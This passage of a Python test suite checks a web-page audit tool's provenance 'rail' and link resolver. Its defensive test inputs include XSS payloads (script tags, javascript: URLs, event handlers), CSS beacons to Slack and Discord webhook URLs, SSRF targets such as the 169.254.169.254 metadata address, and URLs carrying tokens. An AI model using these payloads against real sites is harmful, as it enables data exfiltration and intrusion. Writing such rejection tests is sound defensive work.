            '.bm{background-image:url(https://hooks.slack.com/services/T000/B000/abcdEFGH1234)}',
            '.bm{background-image:url(https://discord.com/api/webhooks/123/abcdEFGH1234)}',
        )
        for rule in rules:
            with self.subTest(rule=rule):
                found = self.run_contract(f"<style>{rule}</style>" + body)
                self.assertEqual(len(found), 1)
                self.assertIn("applicable CSS", found[0].detail)

        imported = (
            '<style>@import url("http://127.0.0.1/private.css");</style>' + body
        )
        document_css_cases = (
            imported,
            '<style media="print">@import "https://public.example/x.css";</style>' + body,
            '<style media="screen and (min-width:1px)">aside{background:url(http://127.0.0.1/x)}</style>' + body,
            '<style>@font-face{src:url(http://127.0.0.1/font)}</style>' + body,
            '<link rel="stylesheet" href="https://localhost/private.css">' + body,
        )
        for document_css in document_css_cases:
            with self.subTest(document_css=document_css[:80]):
                found = self.run_contract(document_css)
                self.assertEqual(len(found), 1)
                self.assertTrue(
                    "@import" in found[0].detail or "URL" in found[0].detail,
                    found[0].detail,
                )

        inline_css = (
            r'''style='content:"private\20 prompt\3a secret"' ''',
            r'''style='--x:sk\5f live\5f ABCDEFGHIJKLMNOP' ''',
            r'''style='background:url(http\3a \2f \2f 127.0.0.1/private)' ''',
        )
        for attribute in inline_css:
            with self.subTest(attribute=attribute):
                inline_body = AUDIT_RAIL.replace("<aside ", f"<aside {attribute} ", 1)
                found = self.run_contract(inline_body)
                self.assertEqual(len(found), 1)

    def test_audit_rail_rejects_active_elements_and_attributes(self):
        additions = (
            '<script>alert(1)</script>',
            '<object data="https://example.test/x"></object>',
            '<embed src="https://example.test/x">',
            '<iframe srcdoc="<p>unsafe</p>"></iframe>',
            '<form action="javascript:alert(1)"><input></form>',
            '<base href="https://evil.example/">',
            '<button formaction="javascript:alert(1)">go</button>',
            '<svg><a xlink:href="javascript:alert(1)">go</a></svg>',
            '<span onclick="alert(1)">go</span>',
        )
        for addition in additions:
            with self.subTest(addition=addition):
                body = AUDIT_RAIL.replace("</aside>", addition + "</aside>")
                found = self.run_contract(body)
                self.assertEqual(len(found), 1)
                self.assertIn("not allowed", found[0].detail)

    def test_equal_clocks_still_need_one_checked_and_one_changed_label(self):
        same = AUDIT_RAIL.replace(
            "2026-08-25T23:06:50-07:00", "2026-08-31T20:00:00Z"
        ).replace(
            "2026-08-31T20:00:00-05:00", "2026-08-31T20:00:00Z"
        ).replace("August 25, 2026", "August 31, 2026")
        combined = same.replace(
            "Checked August 31, 2026", "Checked and changed August 31, 2026"
        ).replace("Changed August 31, 2026", "August 31, 2026", 1)
        found = self.run_contract(combined)
        self.assertEqual(len(found), 1)
        self.assertIn("cannot claim both", found[0].detail)

    def test_equal_iso_clocks_with_separate_adjacent_labels_are_unambiguous(self):
        instant = "2026-08-31T20:00:00+00:00"
        body = AUDIT_RAIL.replace(
            "2026-08-25T23:06:50-07:00", instant
        ).replace(
            "2026-08-31T20:00:00-05:00", instant
        ).replace(
            f'<time datetime="{instant}">Changed August 25, 2026</time>'
            f'<time datetime="{instant}">Checked August 31, 2026</time>',
            f'<p>Checked <time datetime="{instant}">{instant}</time>; '
            f'meaning last changed <time datetime="{instant}">{instant}</time>.</p>',
        )
        self.assertEqual(self.run_contract(body), [])

    def test_presentation_attributes_and_public_web_paths_are_not_machine_paths(self):
        additions = (
            'style="background-image:url(/wp-content/uploads/logo.png)"',
            'aria-label="See /docs/public/receipt.html"',
        )
        for addition in additions:
            with self.subTest(attribute=addition):
                body = AUDIT_RAIL.replace("<aside ", f"<aside {addition} ", 1)
                self.assertEqual(self.run_contract(body), [])

    def test_public_class_and_id_bytes_cannot_leak_email_addresses(self):
        for addition in ('class="contact@example.com"', 'id="contact@example.com"'):
            with self.subTest(attribute=addition):
                body = AUDIT_RAIL.replace("<aside ", f"<aside {addition} ", 1)
                found = self.run_contract(body)
                self.assertEqual(len(found), 1)
                self.assertIn("email address", found[0].detail)

    def test_unapproved_root_data_attributes_cannot_claim_a_second_truth(self):
        for addition in (
            'data-verified="true"',
            'data-document-verification="verified"',
            'data-review-status="verified"',
            'data-last-updated="2099-01-01"',
            'data-verification-result="success"',
        ):
            with self.subTest(attribute=addition):
                body = AUDIT_RAIL.replace("<aside ", f"<aside {addition} ", 1)
                found = self.run_contract(body)
                self.assertEqual(len(found), 1)

    def test_visible_alternate_truth_inside_the_rail_is_rejected(self):
        contradictions = (
            "<p>By Alice Jones.</p>",
            "<p>Written by Alice Jones.</p>",
            "<p>Author: Alice Jones.</p>",
            "<p>Last updated July 22, 2025.</p>",
            "<p>Last checked: July 22, 2025.</p>",
            "<p>Verification failed.</p>",
            "<p>This is not verified.</p>",
            "<p>Review status: pending.</p>",
            "<p>Human author： Alice Jones.</p>",
            "<p>State∶ verified.</p>",
            "<p>Model： Claude.</p>",
        )
        for contradiction in contradictions:
            with self.subTest(contradiction=contradiction):
                found = self.run_contract(
                    AUDIT_RAIL.replace("</aside>", contradiction + "</aside>")
                )
                self.assertEqual(len(found), 1)

    def test_document_metadata_and_byline_must_agree_with_the_rail(self):
        contradictions = (
            '<meta name="author" content="Alice Jones">',
            '<meta property="article:modified_time" content="2025-01-01T00:00:00Z">',
            '<time class="updated" datetime="2025-01-01T00:00:00Z">Old</time>',
            '<p>By Alice Jones · Last updated January 1, 2025</p>',
            '<p>Article by Alice Jones.</p>',
            '<p>Posted by Alice Jones.</p>',
            '<p>Authored by Alice Jones.</p>',
            '<p>Meet the author: Alice Jones.</p>',
            '<p>Author Alice Jones.</p>',
            '<p>Last modified: September 1, 2025.</p>',
            '<p>Modified September 1, 2025.</p>',
            '<p>Last revised: September 1, 2025.</p>',
            '<p>Edited September 1, 2025.</p>',
            '<p>Page updated September 1, 2025.</p>',
            '<script type="application/ld+json">'
            '{"@context":"https://schema.org","@type":"Article",'
            '"author":{"name":"Alice Jones"},'
            '"dateModified":"2025-01-01T00:00:00Z"}</script>',
        )
        for contradiction in contradictions:
            with self.subTest(contradiction=contradiction[:80]):
                self.assertEqual(len(self.run_contract(contradiction + AUDIT_RAIL)), 1)

        matching = (
            '<meta name="author" content="Dennis Yu">'
            '<meta property="article:modified_time" '
            'content="2026-08-25T23:06:50-07:00">'
            '<p>By Dennis Yu · Last updated August 25, 2026</p>'
            '<script type="application/ld+json">'
            '{"@context":"https://schema.org","@type":"Article",'
            '"author":{"name":"Dennis Yu"},'
            '"dateModified":"2026-08-25T23:06:50-07:00"}</script>'
        )
        self.assertEqual(self.run_contract(matching + AUDIT_RAIL), [])
        self.assertEqual(
            self.run_contract(
                '<p>The vendor API was last updated July 22, 2025.</p>'
                + AUDIT_RAIL
            ),
            [],
        )

    def test_outside_generated_css_truth_must_agree_with_the_rail(self):
        contradictions = (
            '<style>body::before{content:"By Alice Smith."}</style>',
            '<style>h1::after{content:"Last updated September 1, 2025."}</style>'
            '<h1>Title</h1>',
            '<style>.outside::before{content:"Verification failed."}</style>'
            '<p class="outside">Status</p>',
        )
        for contradiction in contradictions:
            with self.subTest(contradiction=contradiction):
                self.assertEqual(len(self.run_contract(contradiction + AUDIT_RAIL)), 1)

    def test_profile_metadata_is_not_misread_as_a_literal_human_name(self):
        metadata = (
            '<meta property="article:author" content="https://dennisyu.com/">'
            '<meta name="twitter:creator" content="@dennisyu">'
        )
        self.assertEqual(self.run_contract(metadata + AUDIT_RAIL), [])

    def test_primary_article_microdata_and_visibility_are_reconciled(self):
        contradictions = (
            '<article itemscope itemtype="https://schema.org/Article">'
            '<span itemprop="author creator">Alice Smith</span></article>',
            '<article itemscope itemtype="https://schema.org/Article">'
            '<span itemprop="dateModified datePublished">'
            '2025-01-01T00:00:00Z</span></article>',
            '<article itemscope itemtype="https://schema.org/Article">'
            '<div itemprop="author" itemscope itemtype="https://schema.org/Person">'
            '<meta itemprop="name" content="Alice Smith"></div></article>',
        )
        for contradiction in contradictions:
            with self.subTest(contradiction=contradiction):
                self.assertEqual(len(self.run_contract(contradiction + AUDIT_RAIL)), 1)

        css_hidden = (
            '<style>.old{display:none}</style>'
            '<article itemscope itemtype="https://schema.org/Article">'
            '<span class="old" itemprop="author">Alice Smith</span></article>'
            '<time class="old updated" datetime="2025-01-01T00:00:00Z">Old</time>'
        )
        self.assertEqual(self.run_contract(css_hidden + AUDIT_RAIL), [])

        matching_attribute_values = (
            '<article itemscope itemtype="https://schema.org/Article">'
            '<time itemprop="dateModified" '
            'datetime="2026-08-25T23:06:50-07:00">August 25, 2026</time>'
            '</article>',
            '<article itemscope itemtype="https://schema.org/Article">'
            '<data itemprop="dateModified" '
            'value="2026-08-25T23:06:50-07:00">August 25, 2026</data>'
            '</article>',
        )
        for matching in matching_attribute_values:
            with self.subTest(matching=matching):
                self.assertEqual(self.run_contract(matching + AUDIT_RAIL), [])

    def test_jsonld_article_aliases_references_and_owner_count_are_strict(self):
        referenced = (
            '<script type="application/ld+json">'
            '{"@context":{"fullName":"https://schema.org/name",'
            '"@vocab":"https://schema.org/"},"@graph":['
            '{"@type":"NewsArticle","author":{"@id":"#person"},'
            '"dateModified":"2026-08-25T23:06:50-07:00"},'
            '{"@id":"#person","@type":"Person","fullName":"Dennis Yu"}]}'
            '</script>'
        )
        self.assertEqual(self.run_contract(referenced + AUDIT_RAIL), [])

        alias_collision = (
            '<script type="application/ld+json">'
            '{"@context":{"@vocab":"https://schema.org/",'
            '"creator":"https://schema.org/author"},"@type":"Article",'
            '"creator":{"name":"Alice Smith"},'
            '"author":{"name":"Dennis Yu"},'
            '"dateModified":"2026-08-25T23:06:50-07:00"}'
            '</script>'
        )
        two_owners = (
            '<script type="application/ld+json">'
            '{"@context":"https://schema.org","@graph":['
            '{"@type":"Article","author":{"name":"Dennis Yu"},'
            '"dateModified":"2026-08-25T23:06:50-07:00"},'
            '{"@type":"TechArticle","author":{"name":"Dennis Yu"},'
            '"dateModified":"2026-08-25T23:06:50-07:00"}]}'
            '</script>'
        )
        for hostile in (alias_collision, two_owners):
            with self.subTest(hostile=hostile[:100]):
                self.assertEqual(len(self.run_contract(hostile + AUDIT_RAIL)), 1)

        disabled_author_term = (
            '<script type="application/ld+json">'
            '{"@context":["https://schema.org",{"author":null}],'
            '"@type":"Article","author":{"name":"Alice Smith"},'
            '"dateModified":"2026-08-25T23:06:50-07:00"}'
            '</script>'
        )
        self.assertEqual(self.run_contract(disabled_author_term + AUDIT_RAIL), [])

    def test_root_role_must_preserve_document_semantics(self):
        for role in (
            "button", "link", "checkbox", "tab", "alert", "application",
            "separator", "none", "presentation", "img",
        ):
            with self.subTest(role=role):
                body = AUDIT_RAIL.replace("<aside ", f'<aside role="{role}" ', 1)
                self.assertEqual(len(self.run_contract(body)), 1)
        for role in ("complementary", "region"):
            with self.subTest(role=role):
                body = AUDIT_RAIL.replace("<aside ", f'<aside role="{role}" ', 1)
                self.assertEqual(self.run_contract(body), [])

    def test_receipt_id_and_url_filename_must_agree(self):
        mismatch = AUDIT_RAIL.replace(
            'data-publication-receipt-id="receipt-100"',
            'data-publication-receipt-id="receipt-999"',
        )
        found = self.run_contract(mismatch)
        self.assertEqual(len(found), 1)
        self.assertIn("filename must equal", found[0].detail)

    def test_malformed_urls_fail_closed_without_crashing(self):
        for invalid in (
            "https://[bad",
            "https://example.test:99999/receipts/receipt-100.json",
            "https://example.test/receipts/receipt 100.json",
            "https://example.test/receipts/receipt-100.json%0A",
        ):
            with self.subTest(url=invalid):
                body = AUDIT_RAIL.replace(
                    "https://example.test/receipts/receipt-100.json", invalid, 1
                )
                found = self.run_contract(body)
                self.assertEqual(len(found), 1)
                self.assertIn(
                    "data-publication-receipt-discovery-url", found[0].detail
                )

    def test_attributes_split_across_elements_do_not_combine(self):
        split = (
            '<section data-human-author="Dennis Yu" data-maintainer="Codex audit">'
            '<aside data-document-provenance="receipt-linked" '
            'data-verification-scope="external-exact-live-bytes" '
            'data-human-reviewer="Mina Patel" data-capture-run-id="capture-100" '
            'data-scheduler-capture-result="success" '
            'data-publication-verification-result="success" '
            'data-publication-receipt-id="receipt-100" '
            'data-publication-receipt-index="https://example.test/receipts" '
            'data-publication-receipt-discovery-url="https://example.test/receipts/receipt-100.json" '
            'data-last-checked="2026-08-31T20:00:00-05:00" '
            'data-last-changed="2026-08-25T23:06:50-07:00" '
            'data-source-revision="wp:110278:113449">'
            '<time datetime="2026-08-31T20:00:00-05:00">Checked</time>'
            '<time datetime="2026-08-25T23:06:50-07:00">Changed</time>'
            '</aside></section>'
        )
        found = self.run_contract(split)
        self.assertEqual(len(found), 1)
        self.assertIn("same-element", found[0].detail)

    def test_two_visible_rails_fail_even_when_each_is_complete(self):
        found = self.run_contract(AUDIT_RAIL + AUDIT_RAIL)
        self.assertEqual(len(found), 1)
        self.assertIn("found 2", found[0].detail)


class UrlExtractionTests(unittest.TestCase):
    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory()
        self.dir = Path(self._tmp.name)
        self.addCleanup(self._tmp.cleanup)

    def check(self, **overrides):
        base = {
            "id": "links",
            "kind": "resolve_urls",
            "extract": "href=\"(https?://[^\"]+)\"",
            "message": "dead link",
            "examples": {"extracts": [{"html": "", "urls": []}]},
        }
        return build([{**base, **overrides}], self.dir).checks[0]

    def test_within_narrows_the_document(self):
        check = self.check(
            within='"sameAs"\\s*:\\s*\\[[^\\]]*\\]',
            extract='"(https?://[^"]+)"',
        )
        body = (
            '<a href="https://ignore.test/">x</a>'
            '{"sameAs":["https://a.test/1","https://b.test/2"],"url":"https://skip.test/"}'
        )
        self.assertEqual(
            fleet_check.extract_urls(check, body),
            ["https://a.test/1", "https://b.test/2"],
        )

    def test_escaped_json_ld_slashes_are_normalised(self):
        """Rank Math emits sameAs as https:\\/\\/… — the naive extractor misses it."""
        check = self.check(
            within='"sameAs"\\s*:\\s*\\[[^\\]]*\\]',
            extract='"(https?://[^"]+)"',
        )
        body = '{"sameAs":["https:\\/\\/www.wikidata.org\\/wiki\\/Q1"]}'
        self.assertEqual(
            fleet_check.extract_urls(check, body),
            ["https://www.wikidata.org/wiki/Q1"],
        )

    def test_duplicates_collapse(self):
        check = self.check()
        body = '<a href="https://a.test/">1</a><a href="https://a.test/">2</a>'
        self.assertEqual(fleet_check.extract_urls(check, body), ["https://a.test/"])

    def test_shipped_anchor_extractor_accepts_html_quote_forms(self):
        standard = next(
            item
            for item in load_standards(REPOSITORY / "standards")
            if item.slug == "links-must-resolve"
        )
        check = next(item for item in standard.checks if item.id == "outbound-links-resolve")
        body = (
            "<a href='https://a.test/single'>A</a>"
            "<a href=https://b.test/bare>B</a>"
            '<a href="https://c.test/double">C</a>'
        )
        self.assertEqual(
            fleet_check.extract_urls(check, body),
            [
                "https://a.test/single",
                "https://b.test/bare",
                "https://c.test/double",
            ],
        )

    def test_shipped_anchor_extractor_uses_real_active_anchor_elements(self):
        standard = next(
            item
            for item in load_standards(REPOSITORY / "standards")
            if item.slug == "links-must-resolve"
        )
        check = next(item for item in standard.checks if item.id == "outbound-links-resolve")
        body = (
            "<!-- <a href='https://comment.test/'> -->"
            "<script>const x = '<a href=\"https://script.test/\">';</script>"
            "<template><a href=https://template.test/></template>"
            "<textarea><a href=https://textarea.test/></textarea>"
            "<canvas><a href=https://canvas.test/></canvas>"
            "<datalist><a href=https://datalist.test/></datalist>"
            "<select><a href=https://select.test/></select>"
            '<a data-href="https://data.test/" title="href=https://title.test/">x</a>'
            '<div data-note="<a href=https://attribute.test/>">x</div>'
            "<a href=' \n h&#116;tps&#58;//real.test/path '>real</a>"
            "<a href=//external.test/protocol-relative>relative</a>"
        )
        self.assertEqual(
            fleet_check.extract_urls(check, body, "https://origin.test/page"),
            ["https://real.test/path", "https://external.test/protocol-relative"],
        )

    def test_anchor_extractor_honors_base_internal_area_and_svg_links(self):
        standard = next(
            item
            for item in load_standards(REPOSITORY / "standards")
            if item.slug == "links-must-resolve"
        )
        check = next(item for item in standard.checks if item.id == "outbound-links-resolve")
        body = (
            '<head><base href="https://external.test/base/"></head>'
            '<a href="dead">relative</a>'
            '<a href="/root">root</a>'
            '<a href="?view=public">query</a>'
            '<map><area href="https://area.test/dead" shape="default"></map>'
            '<svg><a xlink:href="https://svg.test/dead">svg</a></svg>'
        )
        self.assertEqual(
            fleet_check.extract_urls(check, body, "https://origin.test/page"),
            [
                "https://external.test/base/dead",
                "https://external.test/root",
                "https://external.test/base/?view=public",
                "https://area.test/dead",
                "https://svg.test/dead",
            ],
        )

        late_base = (
            '<a href="relative">before base</a>'
            '<base href="https://base.example/sub/">'
        )
        self.assertEqual(
            fleet_check.extract_urls(check, late_base, "https://origin.test/page"),
            ["https://base.example/sub/relative"],
        )

        unsafe_base = '<base href="http://localhost/private"><a href="dead">x</a>'
        with mock.patch.object(fleet_check, "status_of") as status:
            found = fleet_check.run_resolve_check(
                check, "https://origin.test/", unsafe_base, "error", pause=0
            )
            self.assertEqual(len(found), 1)
            self.assertIn("unsafe document base URL", found[0].detail)
            status.assert_not_called()

    def test_shipped_sameas_extractor_parses_only_jsonld_scalar_or_list_values(self):
        standard = next(
            item
            for item in load_standards(REPOSITORY / "standards")
            if item.slug == "links-must-resolve"
        )
        check = next(item for item in standard.checks if item.id == "schema-sameas-resolves")
        body = (
            '<!-- {"sameAs":"https://comment.test/"} -->'
            '<p>{"sameAs":"https://paragraph.test/"}</p>'
            '<script>{"sameAs":"https://wrong-script.test/"}</script>'
            '<script type="application/ld+json">'
            '{"@graph":[{"sameAs":"\\u0068ttps://scalar.test/x"},'
            '{"sameAs":["https://list.test/y"]}]}'
            "</script>"
        )
        self.assertEqual(
            fleet_check.extract_urls(check, body),
            ["https://scalar.test/x", "https://list.test/y"],
        )

        extended = (
            '<div id="person"></div>'
            '<script type="application/ld+json">'
            '{"sameAs":[{"@id":"https://entity.test/id"},"/entity/profile",'
            '"profile","?view=public","#person"]}'
            "</script>"
        )
        self.assertEqual(
            fleet_check.extract_urls(check, extended, "https://origin.test/page"),
            [
                "https://entity.test/id",
                "https://origin.test/entity/profile",
                "https://origin.test/profile",
                "https://origin.test/page?view=public",
            ],
        )

        contextual = (
            '<script type="application/ld+json">'
            '{"@context":{"schema":"https://schema.org/",'
            '"identity":"https://schema.org/sameAs"},'
            '"https://schema.org/sameAs":"https://expanded.test/",'
            '"schema:sameAs":"https://prefixed.test/",'
            '"identity":"https://aliased.test/"}'
            "</script>"
            '<script type="application/ld+json">'
            '{"@context":{"sameAs":"https://example.test/not-same-as"},'
            '"sameAs":"https://redefined.test/"}'
            "</script>"
        )
        self.assertEqual(
            fleet_check.extract_urls(check, contextual),
            [
                "https://expanded.test/",
                "https://prefixed.test/",
                "https://aliased.test/",
            ],
        )

        order_independent_context = (
            '<script type="application/ld+json">'
            '{"@context":{"s":{"@id":"schema:sameAs"},'
            '"schema":"https://schema.org/"},"s":"https://ordered.test/"}'
            "</script>"
        )
        self.assertEqual(
            fleet_check.extract_urls(check, order_independent_context),
            ["https://ordered.test/"],
        )
        remapped_vocab = (
            '<script type="application/ld+json">'
            '{"@context":{"@vocab":"https://not-schema.example/"},'
            '"sameAs":"https://not-a-schema-claim.test/"}'
            "</script>"
        )
        self.assertEqual(fleet_check.extract_urls(check, remapped_vocab), [])

    def test_jsonld_context_and_fragment_ambiguity_is_fail_closed(self):
        standard = next(
            item
            for item in load_standards(REPOSITORY / "standards")
            if item.slug == "links-must-resolve"
        )
        check = next(item for item in standard.checks if item.id == "schema-sameas-resolves")
        bodies = (
            '<script type="application/ld+json">'
            '{"@context":"https://custom.example/context",'
            '"sameAs":"https://dead.test/"}</script>',
            '<script type="application/ld+json">'
            '{"@context":null,"sameAs":"https://dead.test/"}</script>',
            '<script type="application/ld+json">'
            '{"@context":{"@base":"https://other.example/"},'
            '"sameAs":"profile"}</script>',
            '<script type="application/ld+json" src="https://data.example/x">'
            '{"sameAs":"https://dead.test/"}</script>',
            '<script type="application/ld+json">{"sameAs":"#missing"}</script>',
        )
        for body in bodies:
            with self.subTest(body=body), mock.patch.object(
                fleet_check, "status_of"
            ) as status:
                found = fleet_check.run_resolve_check(
                    check, "https://origin.test/", body, "error", pause=0
                )
                self.assertEqual(len(found), 1)
                self.assertIn("JSON-LD", found[0].detail)
                status.assert_not_called()

        disabled = (
            '<script type="application/ld+json">'
            '{"@context":{"sameAs":null},'
            '"sameAs":"https://not-a-claim.test/"}</script>'
        )
        self.assertEqual(fleet_check.extract_urls(check, disabled), [])

    def test_jsonld_inside_inert_html_is_not_an_active_entity_claim(self):
        standard = next(
            item
            for item in load_standards(REPOSITORY / "standards")
            if item.slug == "links-must-resolve"
        )
        check = next(item for item in standard.checks if item.id == "schema-sameas-resolves")
        script = (
            '<script type="application/ld+json">'
            '{"sameAs":"https://dead.test/"}</script>'
        )
        for tag in ("template", "noscript", "textarea", "xmp", "select", "iframe"):
            with self.subTest(tag=tag):
                self.assertEqual(
                    fleet_check.extract_urls(check, f"<{tag}>{script}</{tag}>"), []
                )

    def test_malformed_or_duplicate_sameas_jsonld_is_blocking(self):
        standard = next(
            item
            for item in load_standards(REPOSITORY / "standards")
            if item.slug == "links-must-resolve"
        )
        check = next(item for item in standard.checks if item.id == "schema-sameas-resolves")
        bodies = (
            '<script type="application/ld+json">{"sameAs":"https://dead.test/"</script>',
            '<script type="application/ld+json">'
            '{"sameAs":"https://dead.test/","sameAs":"https://good.test/"}'
            "</script>",
            '<script type="application/ld+json">'
            '{"same\\u0041s":"https://a.test/","sam\\u0065As":"https://b.test/"}'
            "</script>",
            '<script type="application/ld+json">'
            '{"same\\u0041s":"https://dead.test/"',
            '<script type="application/ld+json">'
            '{"sameAs":"https://dead.test/"}',
        )
        for body in bodies:
            with self.subTest(body=body), mock.patch.object(
                fleet_check, "status_of"
            ) as status:
                found = fleet_check.run_resolve_check(
                    check, "https://origin.test/", body, "error", pause=0
                )
                self.assertEqual(len(found), 1)
                self.assertIn("JSON-LD", found[0].detail)
                status.assert_not_called()

    def test_browser_ambiguous_backslash_anchor_is_blocking(self):
        standard = next(
            item
            for item in load_standards(REPOSITORY / "standards")
            if item.slug == "links-must-resolve"
        )
        check = next(item for item in standard.checks if item.id == "outbound-links-resolve")
        for href in (r"\\evil.test\path", r"https:\\evil.test\path"):
            with self.subTest(href=href), mock.patch.object(
                fleet_check, "status_of"
            ) as status:
                found = fleet_check.run_resolve_check(
                    check,
                    "https://origin.test/",
                    f'<a href="{href}">unsafe</a>',
                    "error",
                    pause=0,
                )
                self.assertEqual(len(found), 1)
                self.assertIn("backslashes", found[0].detail)
                status.assert_not_called()

    def test_malformed_head_anchor_is_blocking_and_plaintext_stays_inert(self):
        standard = next(
            item
            for item in load_standards(REPOSITORY / "standards")
            if item.slug == "links-must-resolve"
        )
        check = next(item for item in standard.checks if item.id == "outbound-links-resolve")
        with mock.patch.object(fleet_check, "status_of") as status:
            found = fleet_check.run_resolve_check(
                check,
                "https://origin.test/",
                '<head><a href="https://dead.test/">unexpected</a></head>',
                "error",
                pause=0,
            )
            self.assertEqual(len(found), 1)
            self.assertIn("HTML head", found[0].detail)
            status.assert_not_called()

        for inert in (
            '<plaintext></plaintext><a href="https://plain.test/">text</a>',
            '<template></script><a href="https://template.test/">text</a></template>',
            '<template><head><a href="https://template-head.test/">text</a></head></template>',
        ):
            with self.subTest(inert=inert):
                self.assertEqual(fleet_check.extract_urls(check, inert), [])

    def test_unsupported_anchor_schemes_and_missing_fragments_are_blocking(self):
        standard = next(
            item
            for item in load_standards(REPOSITORY / "standards")
            if item.slug == "links-must-resolve"
        )
        check = next(item for item in standard.checks if item.id == "outbound-links-resolve")
        for href in (
            "file:///Users/alice/private.txt",
            "javascript:alert(1)",
            "data:text/html,secret",
            "ftp://files.example/archive",
        ):
            with self.subTest(href=href), mock.patch.object(
                fleet_check, "status_of"
            ) as status:
                found = fleet_check.run_resolve_check(
                    check,
                    "https://origin.test/page",
                    f'<a href="{href}">unsafe</a>',
                    "error",
                    pause=0,
                )
                self.assertEqual(len(found), 1)
                self.assertIn("scheme", found[0].detail)
                status.assert_not_called()

        with mock.patch.object(fleet_check, "status_of") as status:
            found = fleet_check.run_resolve_check(
                check,
                "https://origin.test/page",
                '<a href="#missing">missing</a><h2 id="present">Present</h2>',
                "error",
                pause=0,
            )
            self.assertEqual(len(found), 1)
            self.assertIn("fragment", found[0].detail)
            status.assert_not_called()
        self.assertEqual(
            fleet_check._extract_urls_with_problems(
                check,
                '<a href="#present">present</a><h2 id="present">Present</h2>',
                "https://origin.test/page",
            ),
            ([], []),
        )

    def test_provenance_proof_links_bypass_same_host_and_generic_limit(self):
        standard = next(
            item
            for item in load_standards(REPOSITORY / "standards")
            if item.slug == "links-must-resolve"
        )
        check = next(item for item in standard.checks if item.id == "outbound-links-resolve")
        unrelated = "".join(
            f'<a href="https://outside-{index}.test/">x</a>' for index in range(45)
        )
        requested: list[str] = []

        def status(target: str) -> tuple[int, str]:
            requested.append(target)
            return 200, ""

        with mock.patch.object(fleet_check, "status_of", side_effect=status):
            findings = fleet_check.run_resolve_check(
                check,
                "https://example.test/page",
                unrelated + AUDIT_RAIL,
                "error",
                pause=0,
            )
        for required in (
            "https://example.test/sources/fleet.json",
            "https://example.test/receipts",
            "https://example.test/receipts/receipt-100.json",
        ):
            self.assertIn(required, requested)
        self.assertTrue(
            any("audit incomplete" in finding.detail for finding in findings),
            findings,
        )

    def test_unsafe_link_bytes_are_rejected_before_dns_or_request(self):
        unsafe = (
            "https://example.com/?api_key=topsecret",
            "https://example.com/?token=abcdefghijklmnop",
            "https://example.com/ghp_abcdefghijklmnopqrstuvwxyz",
            "https://example.com/alice@example.com",
            "https://example.com/?next=file%3A%2F%2F%2Ftmp%2Fsecret",
            "https://hooks.slack.com/%2573ervices/T000/B000/abcdEFGH1234",
            "https://discord.com/api/%2577ebhooks/123/abcdEFGH1234",
            "https://api.telegram.org/%2562ot123456:AbCdEfGhIjKl/getMe",
            "https://example.com/?client_secret=",
            "https://example.com/?refresh_token=value",
            "https://example.com/?id_token=value",
            "https://example.com/?oauth_token=value",
            "https://example.com/?session_token=value",
            "https://example.com/?authorization=value",
            "https://example.com/?private_key=value",
            "https://example.com/?X-Amz-Signature=value",
            "https://hooks.slack.com/services/T000/B000/secret",
            "https://discord.com/api/webhooks/123/secret",
            "https://api.telegram.org/bot123456:secret/getMe",
        )
        for target in unsafe:
            with self.subTest(target=target), mock.patch.object(
                fleet_check.socket, "getaddrinfo"
            ) as dns:
                resolved, problem = fleet_check._resolve_public_link_target(target)
                self.assertIsNone(resolved)
                self.assertIn("unsafe public URL", problem)
                dns.assert_not_called()

    def test_public_web_routes_are_not_confused_with_local_machine_paths(self):
        for route in (
            "/home/", "/library/", "/applications/", "/system/", "/run/",
            "/var/", "/private/", "/users/", "/tmp/", "/opt/", "/media/",
        ):
            with self.subTest(route=route):
                self.assertIsNone(
                    fleet_check._public_link_url_problem("https://example.com" + route)
                )

    def test_primary_page_fetch_reuses_public_dns_and_redirect_boundary(self):
        with mock.patch.object(fleet_check.socket, "getaddrinfo") as dns:
            with self.assertRaises(ValueError):
                fleet_check.fetch("file:///tmp/private.html")
            dns.assert_not_called()

        approved = fleet_check._ResolvedLinkTarget(
            "https", "public.example", 443, "/", ("93.184.216.34",)
        )
        with mock.patch.object(
            fleet_check,
            "_resolve_public_link_target",
            side_effect=((approved, None), (None, "uses a private/local hostname")),
        ), mock.patch.object(
            fleet_check,
            "_single_page_response",
            return_value=(302, "http://localhost/private", "utf-8", b""),
        ) as request:
            with self.assertRaises(ValueError) as caught:
                fleet_check.fetch("https://public.example/")
        self.assertIn("private", str(caught.exception))
        request.assert_called_once()

    def test_unsafe_link_scanning_precedes_same_host_filter_and_limit(self):
        standard = next(
            item
            for item in load_standards(REPOSITORY / "standards")
            if item.slug == "links-must-resolve"
        )
        check = next(
            item for item in standard.checks if item.id == "outbound-links-resolve"
        )
        safe = "".join(
            f'<a href="https://outside-{index}.test/">x</a>' for index in range(41)
        )
        unsafe_same_host = (
            '<a href="https://example.test/?api_key=topsecret">secret</a>'
        )
        with mock.patch.object(fleet_check, "status_of", return_value=(200, "")):
            found = fleet_check.run_resolve_check(
                check,
                "https://example.test/page",
                safe + unsafe_same_host,
                "error",
                pause=0,
            )
        privacy = [item for item in found if "unsafe public URL omitted" in item.detail]
        self.assertEqual(len(privacy), 1)
        self.assertNotIn("topsecret", privacy[0].detail)

    def test_same_host_links_can_be_skipped_without_any_request(self):
        check = self.check(skip_same_host=True)
        body = '<a href="https://site.test/about/">About</a>'
        self.assertEqual(
            fleet_check.run_resolve_check(check, "https://site.test/", body, "error"),
            [],
        )

    def test_limit_blocks_an_incomplete_audit_without_sampling(self):
        check = self.check(limit=1)
        body = '<a href="https://a.test/">1</a><a href="https://b.test/">2</a>'
        with mock.patch.object(
            fleet_check, "status_of", return_value=(200, "")
        ) as status:
            found = fleet_check.run_resolve_check(
                check, "https://site.test/", body, "error", pause=0
            )
        self.assertEqual(len(found), 1)
        self.assertIn("audit incomplete", found[0].detail)
        status.assert_not_called()

    def test_a_dead_link_is_reported_with_its_status(self):
        check = self.check()
        body = '<a href="https://gone.test/">x</a>'
        original = fleet_check.status_of
        fleet_check.status_of = lambda url: (404, "")
        try:
            found = fleet_check.run_resolve_check(
                check, "https://site.test/", body, "error", pause=0
            )
        finally:
            fleet_check.status_of = original
        self.assertEqual(len(found), 1)
        self.assertIn("HTTP 404", found[0].detail)

    def test_link_resolver_rejects_literal_private_targets_without_requesting(self):
        for target in (
            "http://localhost/private",
            "http://127.0.0.1/private",
            "http://10.0.0.1/private",
            "http://169.254.169.254/latest/meta-data/",
            "http://[::1]/private",
        ):
            with self.subTest(target=target), mock.patch.object(
                fleet_check, "_single_link_response"
            ) as request:
                code, note = fleet_check.status_of(target)
                self.assertEqual(code, 0)
                self.assertTrue("private" in note or "non-public" in note, note)
                request.assert_not_called()

